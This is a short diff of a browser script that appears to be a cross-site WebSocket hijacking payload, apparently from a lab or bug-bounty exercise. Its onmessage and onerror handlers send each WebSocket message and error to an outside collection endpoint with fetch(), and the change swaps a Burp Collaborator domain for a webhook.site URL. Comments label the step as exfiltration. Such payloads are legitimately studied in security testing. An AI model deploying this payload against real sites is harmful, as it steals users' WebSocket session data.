@@ -12,13 +12,13 @@
   ws.onmessage = (evt) => {
     // 3) Exfil it to your Burp Collaborator
     //    Replace COLLAB_ID with your actual collaborator subdomain
-    fetch('https://042j0d6e8xizugbtorowgmeef5lw9nxc.oastify.com/?data=' +
+    fetch('https://webhook.site/b310a029-5caf-4830-b2c7-73303765ba07/?data=' +
           encodeURIComponent(evt.data))
   };
 
   ws.onerror = (e) => {
     // optional: exfil any errors
-    fetch('https://042j0d6e8xizugbtorowgmeef5lw9nxc.oastify.com/?error=' +
+    fetch('https://webhook.site/b310a029-5caf-4830-b2c7-73303765ba07/?error=' +
           encodeURIComponent(e.message))
   };
 </script>
